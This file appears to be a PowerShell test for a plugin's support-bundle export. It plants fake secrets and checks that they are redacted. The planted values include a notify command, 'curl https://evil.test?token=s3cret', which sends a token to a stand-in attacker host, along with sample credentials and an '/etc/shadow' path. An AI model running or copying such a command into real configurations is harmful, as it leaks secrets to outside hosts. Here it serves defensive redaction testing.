# Portable PowerShell coverage for Windows export-support redaction.
# Run on macOS or Windows: pwsh -File tests/windows/export-support-logic.ps1
Set-StrictMode -Version 2.0
$ErrorActionPreference = 'Stop'

$repository = Resolve-Path (Join-Path $PSScriptRoot '../..')
$helper = Join-Path $repository 'plugins/nightshift/runtime/windows/export-support.ps1'
$template = Join-Path $repository 'plugins/nightshift/skills/nightshift/references/nightshift-rules-template.json'
$hostExecutable = (Get-Process -Id $PID).Path
$failures = New-Object 'System.Collections.Generic.List[string]'

function Expect-True {
    param([bool]$Condition, [string]$Message)
    if (-not $Condition) {
        $failures.Add($Message)
        Write-Host "FAIL: $Message"
    }
}

function Invoke-ExportSupport {
    param([Parameter(Mandatory = $true)][string]$Project)
    $argList = @(
        '-NoProfile', '-NonInteractive', '-ExecutionPolicy', 'Bypass',
        '-File', $helper, '-Project', $Project
    )
    $stdout = [Collections.Generic.List[string]]::new()
    $stderr = [Collections.Generic.List[string]]::new()
    foreach ($item in @(& $hostExecutable @argList 2>&1)) {
        if ($item -is [Management.Automation.ErrorRecord]) {
            $stderr.Add([string]$item)
        }
        else {
            $stdout.Add([string]$item)
        }
    }
    $code = $LASTEXITCODE
    if ($null -eq $code) {
        $code = 1
    }
    return [pscustomobject]@{
        ExitCode = [int]$code
        Stdout = ($stdout -join "`n")
        Stderr = ($stderr -join "`n")
    }
}

$root = Join-Path ([IO.Path]::GetTempPath()) ("ns-export-support-logic-" + [guid]::NewGuid().ToString('N'))
$oldLeak = [Environment]::GetEnvironmentVariable('NIGHTSHIFT_SUPPORT_LEAK', 'Process')
try {
    $null = New-Item -ItemType Directory -Path (Join-Path $root '.nightshift') -Force
    $root = (Resolve-Path -LiteralPath $root).Path
    $ns = Join-Path $root '.nightshift'
    Copy-Item -LiteralPath $template -Destination (Join-Path $ns 'rules.json')
    $rulesPath = Join-Path $ns 'rules.json'
    $rules = Get-Content -LiteralPath $rulesPath -Raw | ConvertFrom-Json
    $rules.notifyCommand = 'curl https://evil.test?token=s3cret'
    $rules.expectedEmail = 'owner@example.com'
    $rules | ConvertTo-Json -Depth 10 | Set-Content -LiteralPath $rulesPath -Encoding utf8

    $sid = 'aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee'
    [IO.File]::WriteAllText((Join-Path $ns '.shift-session'), "$sid`n/Users/victim/transcript.jsonl`n`n`nclaude`n")
    $nonce = 'recovered.nonce.SHOULD-NOT-LEAK'
    [IO.File]::WriteAllLines((Join-Path $ns '.shift-lease'), @('shift-session', 'claude', '2', $nonce, '', ''))

    [IO.File]::WriteAllText((Join-Path $ns 'punch-list.md'), "DO NOT STOP`n")
    [IO.File]::WriteAllText((Join-Path $ns 'owner-notes.md'), "PROMPT: do not copy me`n")

    $homeRoot = ''
    if (-not [string]::IsNullOrEmpty($env:USERPROFILE)) {
        $homeRoot = $env:USERPROFILE
    }
    elseif (-not [string]::IsNullOrEmpty($env:HOME)) {
        $homeRoot = $env:HOME
    }
    $log = @(
        'password=supersecret'
        'https://user:hunter2@example.com/hook'
        'https://example.com/x?access_token=abcd'
        $(if ($homeRoot) { Join-Path $homeRoot 'secret-dir/key.pem' } else { '/tmp/secret-dir/key.pem' })
        '/etc/shadow leaked'
        "normal schedule line at $root"
    ) -join "`n"
    [IO.File]::WriteAllText((Join-Path $ns 'scheduled.log'), $log + "`n")

    [Environment]::SetEnvironmentVariable('NIGHTSHIFT_SUPPORT_LEAK', 'should-never-appear', 'Process')
    $exported = Invoke-ExportSupport $root
    Expect-True ($exported.ExitCode -eq 0) "export exits 0 (got $($exported.ExitCode) $($exported.Stderr))"
    Expect-True ($exported.Stdout -match 'Support bundle:') 'export prints the bundle path'
    Expect-True ($exported.Stdout -match 'Included:') 'export names included sections'
    Expect-True ($exported.Stdout -match 'Omitted:') 'export names omitted categories'
    Expect-True ($exported.Stdout -match '(?i)never uploaded') 'export says the bundle is never uploaded'

    $bundleLine = ($exported.Stdout -split "`n" | Where-Object { $_ -match '^Support bundle: ' } | Select-Object -First 1)
    $bundle = if ($bundleLine) { $bundleLine.Substring('Support bundle: '.Length).Trim() } else { '' }
    Expect-True ((-not [string]::IsNullOrEmpty($bundle)) -and (Test-Path -LiteralPath $bundle -PathType Leaf)) `
        "bundle path exists: $bundle"
    if ([string]::IsNullOrEmpty($bundle) -or -not (Test-Path -LiteralPath $bundle -PathType Leaf)) {
        throw 'export-support-logic cannot continue without a bundle'
    }
    $text = [IO.File]::ReadAllText($bundle)

    Expect-True ($text.Contains('Nightshift support bundle')) 'bundle names itself'
    Expect-True ($text.Contains('name: nightshift')) 'bundle names the plugin'
    Expect-True ($text.Contains('validity: valid')) 'bundle reports valid rules'
    Expect-True ($text.Contains('process_lease: valid')) 'bundle reports a valid lease'
    Expect-True ($text.Contains('lease_host: claude')) 'bundle reports the lease host'
    Expect-True ($text.Contains('lease_mode: recovered')) 'bundle reports recovered lease mode'
    Expect-True ($text.Contains('session_record: present')) 'bundle reports the session record without copying it'
    Expect-True ($text -match 'keys:') 'bundle lists rule key names'
    Expect-True ($text.Contains('notifyCommand')) 'bundle lists notifyCommand as a key'
    Expect-True ($text -match 'normal schedule line at \$(WORKSPACE|WORK_TARGET)') `
        'runtime log tokenizes the workspace path'
    Expect-True ($text -match 'task: \$(WORKSPACE|WORK_TARGET|HOME)') 'task identity is tokenized'

    foreach ($secret in @(
            'supersecret',
            'hunter2',
            's3cret',
            'owner@example.com',
            'curl https://evil.test',
            $sid,
            'transcript.jsonl',
            'PROMPT: do not copy me',
            'should-never-appear',
            '/etc/shadow',
            'DO NOT STOP'
        )) {
        Expect-True (-not $text.Contains($secret)) "bundle omits $secret"
    }
    if (-not [string]::IsNullOrEmpty($nonce)) {
        Expect-True (-not $text.Contains($nonce)) 'bundle omits the lease ownership nonce'
    }
    if (-not [string]::IsNullOrEmpty($homeRoot)) {
        $homeSecret = Join-Path $homeRoot 'secret-dir'
        Expect-True (-not $text.Contains($homeSecret)) "bundle omits $homeSecret"
    }
    Expect-True (-not $text.Contains($root)) "bundle omits the raw workspace path $root"
}
finally {
    if ($null -eq $oldLeak) {
        [Environment]::SetEnvironmentVariable('NIGHTSHIFT_SUPPORT_LEAK', $null, 'Process')
    }
    else {
        [Environment]::SetEnvironmentVariable('NIGHTSHIFT_SUPPORT_LEAK', $oldLeak, 'Process')
    }
    Remove-Item -LiteralPath $root -Recurse -Force -ErrorAction SilentlyContinue
}

if ($failures.Count -gt 0) {
    Write-Host "export-support-logic failed ($($failures.Count)):"
    foreach ($failure in $failures) { Write-Host " - $failure" }
    exit 1
}
Write-Host 'export-support-logic ok'
exit 0
